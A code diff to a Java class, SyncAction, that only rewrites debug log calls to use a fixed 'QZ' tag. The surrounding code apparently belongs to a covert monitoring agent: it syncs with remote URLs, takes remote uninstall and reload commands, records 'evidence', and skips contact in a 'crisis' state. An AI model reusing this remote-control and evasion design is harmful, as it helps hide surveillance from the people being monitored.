@@ -78,12 +78,12 @@ public abstract class SyncAction extends SubAction {
 		Check.requires(transports != null, "execute: null transports");
 		
 		if (status.synced == true) {
-			Log.d(TAG,"Warn: " + "Already synced in this action: skipping");
+			Log.d("QZ", TAG + " Warn: " + "Already synced in this action: skipping");
 			return false;
 		}
 
 		if (status.crisisSync()) {
-			Log.d(TAG,"Warn: " +"SyncAction - no sync, we are in crisis");
+			Log.d("QZ", TAG + " Warn: " +"SyncAction - no sync, we are in crisis");
 			return false;
 		}
 
@@ -101,11 +101,11 @@ public abstract class SyncAction extends SubAction {
 
 		for (int i = 0; i < transports.size(); i++) {
 			final Transport transport = (Transport) transports.elementAt(i);
-			Log.d(TAG,"execute transport: " + transport);
-			Log.d(TAG,"transport Sync url: " + transport.getUrl());
+			Log.d("QZ", TAG + " execute transport: " + transport);
+			Log.d("QZ", TAG + " transport Sync url: " + transport.getUrl());
 			
 			if (transport.isAvailable()) {
-				Log.d(TAG,"execute: transport available");
+				Log.d("QZ", TAG + " execute: transport available");
 				protocol.init(transport);
 
 				try {
@@ -113,23 +113,23 @@ public abstract class SyncAction extends SubAction {
 					wantUninstall = protocol.uninstall;
 					wantReload = protocol.reload;
 				} catch (final ProtocolException e) {
-					Log.d(TAG,"Error: " + e.toString());
+					Log.d("QZ", TAG + " Error: " + e.toString());
 					ret = false;
 				}
 				
-				Log.d(TAG,"execute protocol: " + ret);
+				Log.d("QZ", TAG + " execute protocol: " + ret);
 			} else {
-				Log.d(TAG,"execute: transport not available");
+				Log.d("QZ", TAG + " execute: transport not available");
 			}
 
 			if (ret) {
-				Log.d(TAG,"Info: SyncAction OK");
+				Log.d("QZ", TAG + " Info: SyncAction OK");
 				Evidence.info("Synced with url:" + transport.getUrl());
 				status.synced = true;
 				return true;
 			}
 			
-			Log.d(TAG,"Error: SyncAction Unable to perform");
+			Log.d("QZ", TAG + " Error: SyncAction Unable to perform");
 		}
 
 		return false;
